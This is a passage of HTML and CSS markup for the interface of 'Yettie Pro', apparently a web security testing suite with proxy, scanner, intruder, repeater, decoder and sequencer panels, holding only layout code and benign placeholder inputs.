        .m-5 { margin: var(--spacing-xl) !important; }

        .p-0 { padding: 0 !important; }
        .p-1 { padding: var(--spacing-xs) !important; }
        .p-2 { padding: var(--spacing-sm) !important; }
        .p-3 { padding: var(--spacing-md) !important; }
        .p-4 { padding: var(--spacing-lg) !important; }
        .p-5 { padding: var(--spacing-xl) !important; }

        .rounded { border-radius: var(--radius-md) !important; }
        .rounded-sm { border-radius: var(--radius-sm) !important; }
        .rounded-lg { border-radius: var(--radius-lg) !important; }
        .rounded-xl { border-radius: var(--radius-xl) !important; }
        .rounded-circle { border-radius: 50% !important; }

        .shadow { box-shadow: var(--shadow-md) !important; }
        .shadow-sm { box-shadow: var(--shadow-sm) !important; }
        .shadow-lg { box-shadow: var(--shadow-lg) !important; }
        .shadow-none { box-shadow: none !important; }

        .position-relative { position: relative !important; }
        .position-absolute { position: absolute !important; }
        .position-fixed { position: fixed !important; }
        .position-sticky { position: sticky !important; }

        .overflow-hidden { overflow: hidden !important; }
        .overflow-auto { overflow: auto !important; }
        .overflow-x-auto { overflow-x: auto !important; }
        .overflow-y-auto { overflow-y: auto !important; }

        .cursor-pointer { cursor: pointer !important; }
        .cursor-default { cursor: default !important; }
        .cursor-not-allowed { cursor: not-allowed !important; }

        .user-select-none { user-select: none !important; }
        .user-select-all { user-select: all !important; }

        .transition { transition: all var(--transition-normal) !important; }
        .transition-fast { transition: all var(--transition-fast) !important; }
        .transition-slow { transition: all var(--transition-slow) !important; }
        .progress {
            height: 20px;
            background-color: var(--bg-tertiary);
            border-radius: var(--radius-sm);
            overflow: hidden;
            margin: var(--spacing-md) 0;
        }

        .progress-bar {
            height: 100%;
            background-color: var(--primary-color);
            border-radius: var(--radius-sm);
            transition: width 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: var(--font-size-xs);
            font-weight: 500;
        }
        
        ol {
            counter-reset: step;
            padding-left: 0;
            margin: 1rem 0;
        }

        ol li {
               list-style: none;
               counter-increment: step;

                position: relative;
                padding: 0.75rem 1rem 0.75rem 3rem;
                margin-bottom: 0.75rem;

            background: #ffffff;
            border: 1px solid #e5e7eb;
            border-radius: 10px;

            font-size: 0.95rem;
            line-height: 1.6;
            color: #1f2937;
        }

        /* Number badge */
        ol li::before {
            content: counter(step);
            position: absolute;
            left: 0.75rem;
            top: 50%;
            transform: translateY(-50%);

            width: 28px;
            height: 28px;
            border-radius: 50%;

            background: linear-gradient(135deg, #2563eb, #1e40af);
            color: #fff;

            font-size: 0.85rem;
            font-weight: 600;

            display: flex;
            align-items: center;
            justify-content: center;
       }

       /* Hover */
       ol li:hover {
            background: #f9fafb;
            border-color: #c7d2fe;
       }
       ul {
        padding-left: 0;
        margin: 1rem 0;
       }

       ul li {
            list-style: none;

            position: relative;
            padding: 0.65rem 1rem 0.65rem 2.25rem;
            margin-bottom: 0.5rem;

            background: #ffffff;
            border: 1px solid #e5e7eb;
        border-radius: 8px;

        font-size: 0.95rem;
        line-height: 1.6;
        color: #1f2937;
       }

        /* Custom bullet */
        ul li::before {
            content: "*";
            position: absolute;
            left: 0.85rem;
            top: 50%;
            transform: translateY(-50%);

            color: #2563eb;
            font-size: 1.2rem;
            font-weight: bold;
        }

        /* Hover */
        ul li:hover {
            background: #f9fafb;
            border-color: #c7d2fe;
        }
        
        
        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(255,255,255,1);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }

        .modal-card {
                width: 900px;
             max-width: 95%;
            background: #111;
            color: #eee;
            border-radius: 12px;
            overflow: hidden;
        }


        .close-btn {
            background: none;
            border: none;
            font-size: 22px;
            color: #aaa;
            cursor: pointer;
        }

        .to {
             display: flex;
             gap: 8px;
             margin: 12px;
        }

        .ta {
            padding: 6px 12px;
            background: #222;
            border: none;
            cursor: pointer;
            color: #ccc;
            border-radius: 6px;
        }

        .ta.active {
            background: #4caf50;
            color: #000;
        }

        .ta-content {
            white-space: pre-wrap;
            background: #0b0b0b;
            padding: 12px;
            border-radius: 6px;
            font-family: monospace;
            max-height: 300px;
            overflow: auto;
        }

        .hidden {
            display: none !important;
        }



        
    </style>
</head>
<body>
    <div class="app-container">
        <!-- Sidebar -->
        <div class="sidebar" id="sidebar">
            <div class="logo">
                <div class="logo-icon">
                    <i class="fas fa-shield-alt"></i>
                </div>
                <div class="logo-text">
                    Yettie Pro
                </div>
            </div>

            <!-- Core Tools -->
            <div class="nav-section">
                <div class="nav-title">Core Tools</div>
                <div class="nav-item active" data-tab="dashboard">
                    <i class="fas fa-tachometer-alt"></i>
                    <span>Dashboard</span>
                </div>
                <div class="nav-item" data-tab="target">
                    <i class="fas fa-crosshairs"></i>
                    <span>Target</span>
                </div>
                <div class="nav-item" data-tab="proxy">
                    <i class="fas fa-exchange-alt"></i>
                    <span>Proxy</span>
                </div>
                <div class="nav-item" data-tab="intruder">
                    <i class="fas fa-fighter-jet"></i>
                    <span>Intruder</span>
                </div>
                <div class="nav-item" data-tab="repeater">
                    <i class="fas fa-redo"></i>
                    <span>Repeater</span>
                </div>
                <div class="nav-item" data-tab="scanner">
                    <i class="fas fa-search"></i>
                    <span>Scanner</span>
                </div>
            </div>

            <!-- Advanced Tools -->
            <div class="nav-section">
                <div class="nav-title">Advanced Tools</div>
                <div class="nav-item" data-tab="sequencer">
                    <i class="fas fa-random"></i>
                    <span>Sequencer</span>
                </div>
                <div class="nav-item" data-tab="decoder">
                    <i class="fas fa-code"></i>
                    <span>Decoder</span>
                </div>
                <div class="nav-item" data-tab="comparer">
                    <i class="fas fa-not-equal"></i>
                    <span>Comparer</span>
                </div>
                <div class="nav-item" data-tab="extender">
                    <i class="fas fa-puzzle-piece"></i>
                    <span>Extender</span>
                </div>
                <div class="nav-item" data-tab="collaborator">
                    <i class="fas fa-satellite"></i>
                    <span>Collaborator</span>
                </div>
            </div>

            <!-- Project & User -->
            <div class="nav-section">
                <div class="nav-title">Project & User</div>
                <div class="nav-item" data-tab="projects">
                    <i class="fas fa-folder"></i>
                    <span>Projects</span>
                </div>
                <div class="nav-item" data-tab="sitemap">
                    <i class="fas fa-sitemap"></i>
                    <span>Site Map</span>
                </div>
                <div class="nav-item" data-tab="macros">
                    <i class="fas fa-cogs"></i>
                    <span>Macros</span>
                </div>
                <div class="nav-item" data-tab="sessions">
                    <i class="fas fa-history"></i>
                    <span>Sessions</span>
                </div>
            </div>

            <!-- Settings -->
            <div class="nav-section">
                <div class="nav-title">Settings</div>
                <div class="nav-item" data-tab="settings">
                    <i class="fas fa-cog"></i>
                    <span>Settings</span>
                </div>
                <div class="nav-item" data-tab="logs">
                    <i class="fas fa-clipboard-list"></i>
                    <span>Logs</span>
                </div>
                <div class="nav-item" data-tab="help">
                    <i class="fas fa-question-circle"></i>
                    <span>Help</span>
                </div>
            </div>

            <button class="sidebar-toggle" id="sidebarToggle">
                <i class="fas fa-chevron-left"></i>
            </button>
        </div>

        <!-- Main Content -->
        <div class="main-content">
            <!-- Top Bar -->
            <div class="top-bar">
                <div class="top-bar-left">
                    <div class="status-badge" id="proxyStatus">
                        <i class="fas fa-circle"></i>
                        <span>Proxy: Running</span>
                    </div>
                    <div class="status-badge" id="projectStatus">
                        <i class="fas fa-folder"></i>
                        <span>Project: Default</span>
                    </div>
                    <div class="status-badge warning" id="issueCount">
                        <i class="fas fa-exclamation-triangle"></i>
                        <span>Issues: 0</span>
                    </div>
                    <div class="status-badge info" id="requestCount">
                        <i class="fas fa-exchange-alt"></i>
                        <span>Requests: 0</span>
                    </div>
                </div>

                <div class="top-bar-right">
                    <button class="btn btn-secondary btn-sm" id="interceptToggle">
                        <i class="fas fa-pause"></i>
                        <span>Intercept: On</span>
                    </button>
                    <button class="btn btn-primary btn-sm" id="exportBtn">
                        <i class="fas fa-download"></i>
                        <span>Export</span>
                    </button>
                    <button class="btn btn-success btn-sm" id="newScanBtn">
                        <i class="fas fa-search"></i>
                        <span>New Scan</span>
                    </button>
                    <button class="btn btn-danger btn-sm" id="clearBtn">
                        <i class="fas fa-trash"></i>
                        <span>Clear</span>
                    </button>
                    <button class="btn btn-icon btn-secondary" id="sidebarToggleBtn">
                        <i class="fas fa-bars"></i>
                    </button>
                </div>
            </div>

            <!-- Content Area -->
            <div class="content-area" id="contentArea">
                <!-- Dashboard Tab -->
                <div class="tab-content active" id="dashboardTab">
                    <h2>Security Testing Dashboard</h2>
                    <div class="dashboard-grid">
                        <div class="stat-card">
                            <div class="stat-icon">
                                <i class="fas fa-exchange-alt"></i>
                            </div>
                            <div class="stat-content">
                                <div class="stat-value" id="totalRequests">0</div>
                                <div class="stat-label">Total Requests</div>
                            </div>
                        </div>
                        <div class="stat-card" style="background: linear-gradient(135deg, #dc3545 0%, #bd2130 100%);">
                            <div class="stat-icon">
                                <i class="fas fa-exclamation-triangle"></i>
                            </div>
                            <div class="stat-content">
                                <div class="stat-value" id="totalIssues">0</div>
                                <div class="stat-label">Security Issues</div>
                            </div>
                        </div>
                        <div class="stat-card" style="background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);">
                            <div class="stat-icon">
                                <i class="fas fa-check-circle"></i>
                            </div>
                            <div class="stat-content">
                                <div class="stat-value" id="coverageRate">0%</div>
                                <div class="stat-label">Test Coverage</div>
                            </div>
                        </div>
                        <div class="stat-card" style="background: linear-gradient(135deg, #ffc107 0%, #e0a800 100%);">
                            <div class="stat-icon">
                                <i class="fas fa-clock"></i>
                            </div>
                            <div class="stat-content">
                                <div class="stat-value" id="activeTime">0m</div>
                                <div class="stat-label">Active Session</div>
                            </div>
                        </div>
                    </div>

                    <div class="chart-container line-chart">
                        <div class="chart-title">
                            <i class="fas fa-chart-line"></i>
                            Request Timeline
                        </div>
                        <canvas id="requestChart"></canvas>
                    </div>

                    <div class="chart-container doughnut-chart">
                        <div class="chart-title">
                            <i class="fas fa-chart-pie"></i>
                            Issue Distribution
                        </div>
                        <canvas id="issueChart"></canvas>
                    </div>

                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <i class="fas fa-history"></i>
                                Recent Activity
                            </div>
                            <button class="btn btn-sm btn-secondary" id="refreshActivity">
                                <i class="fas fa-sync"></i> Refresh
                            </button>
                        </div>
                        <div class="card-body">
                            <div class="loading" id="activityLoading">
                                <div class="spinner"></div>
                                <div>Loading activity...</div>
                            </div>
                            <div id="activityContent" style="display: none;"></div>
                        </div>
                    </div>
                </div>

                <!-- Proxy Tab -->
                <div class="tab-content" id="proxyTab">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <i class="fas fa-exchange-alt"></i>
                                HTTP History
                            </div>
                            <div class="d-flex gap-2">
                                <input type="text" class="form-control" style="width: 200px;" placeholder="Filter requests..." id="requestFilter">
                                <select class="form-control form-select" style="width: 150px;" id="methodFilter">
                                    <option value="">All Methods</option>
                                    <option value="GET">GET</option>
                                    <option value="POST">POST</option>
                                    <option value="PUT">PUT</option>
                                    <option value="DELETE">DELETE</option>
                                    <option value="PATCH">PATCH</option>
                                    <option value="HEAD">HEAD</option>
                                    <option value="OPTIONS">OPTIONS</option>
                                </select>
                                <button class="btn btn-sm btn-secondary" id="clearHistory">
                                    <i class="fas fa-trash"></i> Clear
                                </button>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="request-list" id="requestList">
                                <!-- Requests will be loaded here -->
                            </div>
                            <div class="empty-state" id="emptyRequests">
                                <i class="fas fa-exchange-alt"></i>
                                <h3>No Requests Captured</h3>
                                <p>Proxy traffic will appear here</p>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Scanner Tab -->
                <div class="tab-content" id="scannerTab">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <i class="fas fa-search"></i>
                                Vulnerability Scanner
                            </div>
                            <div class="d-flex gap-2">
                                <button class="btn btn-sm btn-success" id="startScanBtn">
                                    <i class="fas fa-play"></i> Start Scan
                                </button>
                                <select class="form-control form-select" style="width: 150px;" id="severityFilter">
                                    <option value="">All Severities</option>
                                    <option value="Critical">Critical</option>
                                    <option value="High">High</option>
                                    <option value="Medium">Medium</option>
                                    <option value="Low">Low</option>
                                    <option value="Info">Info</option>
                                </select>
                            </div>
                            

                        </div>
                        <div class="progress-wrapper">
                            <div id="scanProgressBar" class="progress-bar"></div>
                        </div>
                        <span id="scanProgressLabel">0%</span>
                        <div class="card-body">
                            <div class="request-list" id="scanResults">
                                <!-- Scan results will be loaded here -->
                            </div>
                            <div class="empty-state" id="emptyScanResults">
                                <i class="fas fa-search"></i>
                                <h3>No Scan Results</h3>
                                <p>Start a scan to see vulnerabilities</p>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Intruder Tab -->
                <div class="tab-content" id="intruderTab">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <i class="fas fa-fighter-jet"></i>
                                Intruder Attacks
                            </div>
                            <button class="btn btn-sm btn-primary" id="newAttackBtn">
                                <i class="fas fa-plus"></i> New Attack
                            </button>
                        </div>
                        <div class="card-body">
                            <div class="tabs">
                                <div class="tab active" data-intruder-tab="positions">Positions</div>
                                <div class="tab" data-intruder-tab="payloads">Payloads</div>
                                <div class="tab" data-intruder-tab="options">Options</div>
                                <div class="tab" data-intruder-tab="results">Results</div>
                            </div>

                            <div class="tab-content active" id="intruderPositions">
                                <div class="form-group">
                                    <label class="form-label">Attack Type</label>
                                    <select class="form-control form-select" id="attackType">
                                        <option value="sniper">Sniper</option>
                                        <option value="battering_ram">Battering Ram</option>
                                        <option value="pitchfork">Pitchfork</option>
                                        <option value="cluster_bomb">Cluster Bomb</option>
                                    </select>
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Target URL (use § for payload position)</label>
                                    <input type="text" class="form-control" id="targetUrl" placeholder="https://example.com/search?q=§test§">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Request Template</label>
                                    <textarea class="form-control form-textarea" id="requestTemplate" rows="10">
GET /search?q=§test§ HTTP/1.1
Host: example.com
User-Agent: Yettie/1.0
Accept: */*
                                    </textarea>
                                </div>
                            </div>

                            <div class="tab-content" id="intruderPayloads">
                                <div class="form-group">
                                    <label class="form-label">Payload Type</label>
                                    <select class="form-control form-select" id="payloadType">
                                        <option value="simple_list">Simple List</option>
                                        <option value="runtime_file">Runtime File</option>
                                        <option value="custom_iterator">Custom Iterator</option>
                                        <option value="character_substitution">Character Substitution</option>
                                        <option value="recursive_grep">Recursive Grep</option>
                                    </select>
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Payloads (one per line)</label>
                                    <textarea class="form-control form-textarea" id="payloadList" rows="10" placeholder="admin&#10;test&#10;guest&#10;user&#10;password"></textarea>
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Payload Processing Rules</label>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="urlEncode">
                                        <label class="form-check-label" for="urlEncode">URL-encode these characters</label>
                                    </div>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="base64Encode">
                                        <label class="form-check-label" for="base64Encode">Base64-encode</label>
                                    </div>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="hashPayloads">
                                        <label class="form-check-label" for="hashPayloads">Hash payloads (MD5)</label>
                                    </div>
                                </div>
                            </div>

                            <div class="tab-content" id="intruderOptions">
                                <div class="form-group">
                                    <label class="form-label">Number of Threads</label>
                                    <input type="number" class="form-control" id="threadCount" value="5" min="1" max="50">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Request Delay (ms)</label>
                                    <input type="number" class="form-control" id="requestDelay" value="100" min="0" max="10000">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Retry on Failure</label>
                                    <input type="number" class="form-control" id="retryCount" value="3" min="0" max="10">
                                </div>

                                <div class="form-group">
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="followRedirects" checked>
                                        <label class="form-check-label" for="followRedirects">Follow Redirects</label>
                                    </div>
                                    <div class="form-check">
                                        <input type="checkbox" class="form-check-input" id="processCookies" checked>
                                        <label class="form-check-label" for="processCookies">Process Cookies in Response</label>
                                    </div>
                                </div>
                            </div>

                            <div class="tab-content" id="intruderResults">
                                <div class="empty-state">
                                    <i class="fas fa-fighter-jet"></i>
                                    <h3>No Attack Results</h3>
                                    <p>Configure and run an attack to see results</p>
                                </div>
                            </div>

                            <div class="d-flex justify-content-end gap-2 mt-3">
                                <button class="btn btn-secondary" id="saveAttackBtn">
                                    <i class="fas fa-save"></i> Save Attack
                                </button>
                                <button class="btn btn-primary" id="startAttackBtn">
                                    <i class="fas fa-play"></i> Start Attack
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Decoder Tab -->
                <div class="tab-content" id="decoderTab">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <i class="fas fa-code"></i>
                                Decoder
                            </div>
                            <div class="d-flex gap-2">
                                <button class="btn btn-sm btn-secondary" id="clearDecoder">
                                    <i class="fas fa-trash"></i> Clear
                                </button>
                                <button class="btn btn-sm btn-primary" id="copyResult">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="row" style="display: flex; gap: var(--spacing-lg);">
                                <div class="col" style="flex: 1;">
                                    <div class="form-group">
                                        <label class="form-label">Input</label>
                                        <textarea class="form-control form-textarea" id="decoderInput" rows="10" placeholder="Enter text to encode/decode..."></textarea>
                                    </div>
                                </div>
                                <div class="col" style="flex: 1;">
                                    <div class="form-group">
                                        <label class="form-label">Output</label>
                                        <textarea class="form-control form-textarea" id="decoderOutput" rows="10" readonly></textarea>
                                    </div>
                                </div>
                            </div>

                            <div class="row" style="display: flex; gap: var(--spacing-lg); margin-top: var(--spacing-lg);">
                                <div class="col" style="flex: 1;">
                                    <div class="form-group">
                                        <label class="form-label">Encoding/Decoding Operations</label>
                                        <div class="d-flex flex-wrap gap-2">
                                            <button class="btn btn-sm btn-secondary" data-operation="base64_encode">Base64 Encode</button>
                                            <button class="btn btn-sm btn-secondary" data-operation="base64_decode">Base64 Decode</button>
                                            <button class="btn btn-sm btn-secondary" data-operation="url_encode">URL Encode</button>
                                            <button class="btn btn-sm btn-secondary" data-operation="url_decode">URL Decode</button>
                                            <button class="btn btn-sm btn-secondary" data-operation="html_encode">HTML Encode</button>
                                            <button class="btn btn-sm btn-secondary" data-operation="html_decode">HTML Decode</button>
                                            <button class="btn btn-sm btn-secondary" data-operation="hex_encode">Hex Encode</button>
                                            <button class="btn btn-sm btn-secondary" data-operation="hex_decode">Hex Decode</button>
                                            <button class="btn btn-sm btn-secondary" data-operation="rot13">ROT13</button>
                                            <button class="btn btn-sm btn-secondary" data-operation="md5">MD5</button>
                                            <button class="btn btn-sm btn-secondary" data-operation="sha1">SHA-1</button>
                                            <button class="btn btn-sm btn-secondary" data-operation="sha256">SHA-256</button>
                                            <button class="btn btn-sm btn-secondary" data-operation="json_beautify">JSON Beautify</button>
                                            <button class="btn btn-sm btn-secondary" data-operation="jwt_decode">JWT Decode</button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Add more tab content for other tools... -->
                
                                <!-- Target Tab -->
                <div class="tab-content" id="targetTab">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <i class="fas fa-crosshairs"></i>
                                Target Configuration
                            </div>
                            <div class="d-flex gap-2">
                                <button class="btn btn-sm btn-success" id="addTargetBtn">
                                    <i class="fas fa-plus"></i> Add Target
                                </button>
                                <button class="btn btn-sm btn-secondary" id="scanTargetBtn">
                                    <i class="fas fa-search"></i> Spider
                                </button>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="form-group">
                                <label class="form-label">Target URL</label>
                                <div class="d-flex gap-2">
                                    <input type="text" class="form-control" id="targetUrlInput" placeholder="https://example.com">
                                    <button class="btn btn-primary" id="setTargetBtn">Set Target</button>
                                </div>
                            </div>

                            <div class="form-group">
                                <label class="form-label">Scope</label>
                                <textarea class="form-control form-textarea" id="targetScope" rows="5" placeholder="*.example.com&#10;example.com/api/*"></textarea>
                                <div class="text-muted text-sm mt-1">One rule per line. Use * as wildcard.</div>
                            </div>

                            <div class="form-group">
                                <label class="form-label">Exclusions</label>
                                <textarea class="form-control form-textarea" id="targetExclusions" rows="3" placeholder="*.example.com/logout&#10;example.com/admin/delete"></textarea>
                                <div class="text-muted text-sm mt-1">URLs to exclude from testing.</div>
                            </div>

                            <div class="form-group">
                                <div class="form-check">
                                    <input type="checkbox" class="form-check-input" id="advancedMode" checked>
                                    <label class="form-check-label" for="advancedMode">Advanced scope control</label>
                                </div>
                                <div class="form-check">
                                    <input type="checkbox" class="form-check-input" id="includeSubdomains">
                                    <label class="form-check-label" for="includeSubdomains">Include subdomains in scope</label>
                                </div>
                            </div>

                            <div class="d-flex justify-content-between mt-4">
                                <button class="btn btn-secondary" id="clearTargetBtn">
                                    <i class="fas fa-trash"></i> Clear Scope
                                </button>
                                <button class="btn btn-primary" id="saveTargetBtn">
                                    <i class="fas fa-save"></i> Save Configuration
                                </button>
                            </div>
                        </div>
                    </div>

                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <i class="fas fa-sitemap"></i>
                                Site Map
                            </div>
                            <button class="btn btn-sm btn-secondary refreshSiteMap" >
                                <i class="fas fa-sync"></i> Refresh
                            </button>
                        </div>
                        <div class="card-body">
                            <div class="tree-view siteMapTree" >
                                <!-- Site map tree will be loaded here -->
                                <div class="empty-state">
                                    <i class="fas fa-sitemap"></i>
                                    <h3>No Site Map</h3>
                                    <p>Set a target and start browsing to build the site map</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Repeater Tab -->
                <div class="tab-content" id="repeaterTab">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <i class="fas fa-redo"></i>
                                Repeater
                            </div>
                            <div class="d-flex gap-2">
                                <button class="btn btn-sm btn-primary" id="newRepeaterBtn">
                                    <i class="fas fa-plus"></i> New
                                </button>
                                <button class="btn btn-sm btn-secondary" id="saveRepeaterBtn">
                                    <i class="fas fa-save"></i> Save
                                </button>
                                <button class="btn btn-sm btn-danger" id="closeRepeaterBtn">
                                    <i class="fas fa-times"></i> Close
                                </button>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="tabs" id="repeaterTabs">
                                <!-- Repeater tabs will be dynamically added here -->
                                <div class="tab active" data-repeater-tab="repeater1">Request 1</div>
                            </div>

                            <div class="tab-content active" id="repeaterContent1">
                                <div class="row" style="display: flex; gap: var(--spacing-lg);">
                                    <div class="col" style="flex: 1;">
                                        <div class="form-group">
                                            <label class="form-label">Request</label>
                                            <textarea class="form-control form-textarea" rows="15" id="repeaterRequest1">
GET / HTTP/1.1
Host: localhost
User-Agent: Yettie/1.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1</textarea>
                                        </div>
                                        <div class="d-flex justify-content-end gap-2 mt-2">
                                            <button class="btn btn-sm btn-secondary" id="beautifyRequest">
                                                <i class="fas fa-code"></i> Beautify
                                            </button>
                                            <button class="btn btn-sm btn-primary" id="sendRequest">
                                                <i class="fas fa-paper-plane"></i> Send
                                            </button>
                                        </div>
                                    </div>
                                    <div class="col" style="flex: 1;">
                                        <div class="form-group">
                                            <label class="form-label">Response</label>
                                            <textarea class="form-control form-textarea" rows="15" id="repeaterResponse1" readonly placeholder="Send a request to see the response..."></textarea>
                                        </div>
                                        <div class="d-flex justify-content-between mt-2">
                                            <div style="display: flex; justify-content: center; align-items: center; gap: 12px;">
                                                <span class="status-code" id="responseStatus1">Status: -</span>
                                                <span class="text-muted" id="responseSize1">Size: -</span>
                                                <span class="text-muted" id="responseTime1">Time: -</span>
                                            </div>
                                            <button class="btn btn-sm btn-secondary" id="renderResponse">
                                                <i class="fas fa-eye"></i> Render
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Sequencer Tab -->
                <div class="tab-content" id="sequencerTab">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <i class="fas fa-random"></i>
                                Sequencer
                            </div>
                            <div class="d-flex gap-2">
                                <button class="btn btn-sm btn-success" id="startSequencerBtn">
                                    <i class="fas fa-play"></i> Start
                                </button>
                                <button class="btn btn-sm btn-danger" id="stopSequencerBtn" disabled>
                                    <i class="fas fa-stop"></i> Stop
                                </button>
                                <button class="btn btn-sm btn-secondary" id="analyzeSequencerBtn" disabled>
                                    <i class="fas fa-chart-bar"></i> Analyze
                                </button>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="tabs">
                                <div class="tab active" data-sequencer-tab="live">Live Capture</div>
                                <div class="tab" data-sequencer-tab="manual">Manual Load</div>
                                <div class="tab" data-sequencer-tab="analysis">Analysis</div>
                            </div>

                            <div class="tab-content active" id="sequencerLive">
                                <div class="form-group">
                                    <label class="form-label">Capture Source</label>
                                    <select class="form-control form-select" id="captureSource">
                                        <option value="proxy">Proxy Traffic</option>
                                        <option value="custom">Custom Request</option>
                                        <option value="file">From File</option>
                                    </select>
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Token Location</label>
                                    <div class="form-check">
                                        <input type="radio" class="form-check-input" name="tokenLocation" id="tokenCookie" checked>
                                        <label class="form-check-label" for="tokenCookie">Cookie</label>
                                    </div>
                                    <div class="form-check">
                                        <input type="radio" class="form-check-input" name="tokenLocation" id="tokenResponse">
                                        <label class="form-check-label" for="tokenResponse">Response Body</label>
                                    </div>
                                    <div class="form-check">
                                        <input type="radio" class="form-check-input" name="tokenLocation" id="tokenHeader">
                                        <label class="form-check-label" for="tokenHeader">Custom Header</label>
                                    </div>
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Token Name/Regex</label>
                                    <input type="text" class="form-control" id="tokenPattern" placeholder="session_id|csrf_token">
                                </div>

                                <div class="form-group">
                                    <label class="form-label">Number of Tokens to Capture</label>
                                    <input type="number" class="form-control" id="tokenCount" value="100" min="10" max="10000">
                                </div>

                                <div class="progress" style="height: 20px; margin-top: var(--spacing-lg); display: none;" id="sequencerProgress">
                                    <div class="progress-bar" role="progressbar" style="width: 0%;">0%</div>
                                </div>
                            </div>

                            <div class="tab-content" id="sequencerManual">
                                <div class="form-group">
                                    <label class="form-label">Load Tokens</label>
                                    <textarea class="form-control form-textarea" id="manualTokens" rows="10" placeholder="Paste tokens here, one per line..."></textarea>
                                </div>
                                <button class="btn btn-primary" id="loadTokensBtn">
                                    <i class="fas fa-upload"></i> Load Tokens
                                </button>
                            </div>

                            <div class="tab-content" id="sequencerAnalysis">
                                <div class="empty-state">
                                    <i class="fas fa-chart-bar"></i>
                                    <h3>No Analysis Available</h3>
                                    <p>Capture or load tokens to perform analysis</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Comparer Tab -->
                <div class="tab-content" id="comparerTab">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <i class="fas fa-not-equal"></i>
                                Comparer
                            </div>
                            <div class="d-flex gap-2">
                                <button class="btn btn-sm btn-secondary" id="wordDiffBtn">
                                    <i class="fas fa-text-width"></i> Words
                                </button>
                                <button class="btn btn-sm btn-secondary" id="charDiffBtn">
                                    <i class="fas fa-font"></i> Characters
                                </button>
                                <button class="btn btn-sm btn-primary" id="compareBtn">
                                    <i class="fas fa-not-equal"></i> Compare
                                </button>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="row" style="display: flex; gap: var(--spacing-lg);">
                                <div class="col" style="flex: 1;">
                                    <div class="form-group">
                                        <label class="form-label">Item 1</label>
                                        <textarea class="form-control form-textarea" rows="15" id="comparerItem1" placeholder="Enter first item to compare..."></textarea>
                                    </div>
                                    <div class="d-flex justify-content-end gap-2 mt-2">
                                        <button class="btn btn-sm btn-secondary" data-comparer-action="load1">
                                            <i class="fas fa-upload"></i> Load
                                        </button>
                                        <button class="btn btn-sm btn-secondary" data-comparer-action="paste1">
                                            <i class="fas fa-paste"></i> Paste
                                        </button>
                                    </div>
                                </div>
                                <div class="col" style="flex: 1;">
                                    <div class="form-group">
                                        <label class="form-label">Item 2</label>
                                        <textarea class="form-control form-textarea" rows="15" id="comparerItem2" placeholder="Enter second item to compare..."></textarea>
                                    </div>
                                    <div class="d-flex justify-content-end gap-2 mt-2">
                                        <button class="btn btn-sm btn-secondary" data-comparer-action="load2">
                                            <i class="fas fa-upload"></i> Load
                                        </button>
                                        <button class="btn btn-sm btn-secondary" data-comparer-action="paste2">
                                            <i class="fas fa-paste"></i> Paste
                                        </button>
                                    </div>
                                </div>
                            </div>

                            <div class="row" style="margin-top: var(--spacing-xl);">
                                <div class="col">
                                    <div class="form-group">
                                        <label class="form-label">Comparison Results</label>
                                        <div class="code-editor">
                                            <div class="code-content" id="comparerResults">
                                                <div class="empty-state">
                                                    <i class="fas fa-exchange-alt"></i>
                                                    <h3>No Comparison Results</h3>
                                                    <p>Enter items and click Compare to see differences</p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Extender Tab -->
                <div class="tab-content" id="extenderTab">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <i class="fas fa-puzzle-piece"></i>
                                Extensions
                            </div>
                            <div class="d-flex gap-2">
                                <button class="btn btn-sm btn-primary" id="loadExtensionsBtn">
                                    <i class="fas fa-sync"></i> Reload
                                </button>
                                <button class="btn btn-sm btn-success" id="addExtensionBtn">
                                    <i class="fas fa-plus"></i> Add
                                </button>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="tabs">
                                <div class="tab active" data-extender-tab="loaded">Loaded Extensions</div>
